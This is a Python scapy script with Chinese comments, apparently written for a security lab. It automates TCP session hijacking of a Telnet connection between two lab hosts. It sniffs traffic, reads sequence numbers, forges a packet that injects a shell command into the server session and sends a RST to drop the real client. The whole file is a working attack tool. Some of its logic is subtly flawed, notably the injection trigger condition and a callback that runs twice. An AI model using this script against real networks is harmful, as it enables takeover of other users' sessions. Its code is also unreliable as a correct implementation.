#!/usr/bin/env python3
from scapy.all import *
import sys
import time

# ============== 【配置区】 ==============
TARGET_SERVER = "10.9.0.5"
TARGET_CLIENT = "10.9.0.6"
TELNET_PORT = 23
# 根据你之前的网络配置，设置正确的网卡接口。通常是 'br-xxxx' 或 'vethxxxx'
NETWORK_INTERFACE = 'br-a8d4018e5d3c'  # 请根据 `ip addr show` 结果确认
# 要注入的恶意命令
MALICIOUS_CMD = "touch /tmp/auto_hijacked \r\n"
# ========================================

# 全局变量，用于在回调函数间传递最新的序列号信息
latest_client_seq = None
latest_server_ack_for_client = None

def extract_and_inject(pkt):
    """嗅探回调函数：提取参数并发动攻击"""
    global latest_client_seq, latest_server_ack_for_client

    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw):
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        tcp_sport = pkt[TCP].sport
        tcp_dport = pkt[TCP].dport
        tcp_seq = pkt[TCP].seq
        tcp_ack = pkt[TCP].ack
        payload = pkt[Raw].load

        # 1. 监听目标会话，更新最新的序列号信息
        if ip_src == TARGET_CLIENT and ip_dst == TARGET_SERVER and tcp_dport == TELNET_PORT:
            # 这是一个从客户端发往服务器的数据包
            latest_client_seq = tcp_seq
            payload_len = len(payload)
            print(f"[监控] 客户端->服务器: Seq={tcp_seq}, Ack={tcp_ack}, Len={payload_len}, 数据: {repr(payload[:20])}")

        if ip_src == TARGET_SERVER and ip_dst == TARGET_CLIENT and tcp_sport == TELNET_PORT:
            # 这是一个从服务器发往客户端的ACK包，其中的ack字段就是服务器期望的下一个客户端seq
            latest_server_ack_for_client = tcp_ack
            print(f"[监控] 服务器->客户端: 服务器期望的下一个客户端Seq (Ack) = {latest_server_ack_for_client}")

        # 2. 攻击触发条件：当捕获到服务器对客户端的ACK，且我们确认了客户端的最新seq时，发动攻击
        #    这里我们选择在一个相对“安静”的时机注入，比如刚完成一次命令回显后。
        if latest_server_ack_for_client is not None and b"# " in payload or b"$ " in payload:
            # 检测到服务器回显了命令提示符（如'# '或'$ '），这是一个理想的注入时机
            print(f"[!] 检测到命令提示符，准备发动劫持攻击...")
            print(f"    将使用的Seq (服务器期望值): {latest_server_ack_for_client}")
            print(f"    将使用的Ack (客户端期望值): {tcp_seq + len(payload)}")  # 服务器下一个seq

            # 构造恶意数据包
            hijack_ip = IP(src=TARGET_CLIENT, dst=TARGET_SERVER)
            hijack_tcp = TCP(sport=tcp_dport,  # 注意这里要用客户端的端口
                             dport=TELNET_PORT,
                             flags="PA",  # PSH+ACK
                             seq=latest_server_ack_for_client,  # 最关键！
                             ack=tcp_seq + len(payload))
            hijack_data = MALICIOUS_CMD
            hijack_pkt = hijack_ip / hijack_tcp / hijack_data

            print(f"[*] 构造并注入命令: {repr(MALICIOUS_CMD)}")
            send(hijack_pkt, verbose=0)
            print("[+] 恶意数据包已发送！")

            # 发送后，可选：立即发送一个RST包来终止原始客户端连接，避免其干扰（可选，更隐蔽）
            rst_ip = IP(src=TARGET_CLIENT, dst=TARGET_SERVER)
            rst_tcp = TCP(sport=tcp_dport, dport=TELNET_PORT,
                          flags="R", seq=latest_server_ack_for_client + len(MALICIOUS_CMD))
            rst_pkt = rst_ip / rst_tcp
            send(rst_pkt, verbose=0)
            print("[+] 已发送RST包尝试终止原客户端连接。")

            # 攻击完成，退出嗅探（根据需要，也可以不退出持续监听）
            return True
    return False

def main():
    print("[*] 开始自动TCP会话劫持攻击...")
    print(f"[*] 监控接口: {NETWORK_INTERFACE}")
    print(f"[*] 监控会话: {TARGET_CLIENT} -> {TARGET_SERVER}:{TELNET_PORT}")
    print(f"[*] 等待目标Telnet会话流量并寻找注入时机...")
    print("[提示] 请在目标Telnet会话中执行一些命令（如ls, pwd），以产生流量。")

    # 开始嗅探
    try:
        sniff(filter=f"tcp and host {TARGET_CLIENT} and host {TARGET_SERVER}",
              prn=extract_and_inject,
              store=0,
              iface=NETWORK_INTERFACE,
              stop_filter=lambda x: extract_and_inject(x))  # 当回调函数返回True时停止
    except PermissionError:
        print("\n[!] 权限错误。可能需要sudo权限运行：")
        print("    sudo python3 auto_hijack.py")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] 用户中断。退出。")
        sys.exit(0)

if __name__ == "__main__":
    main()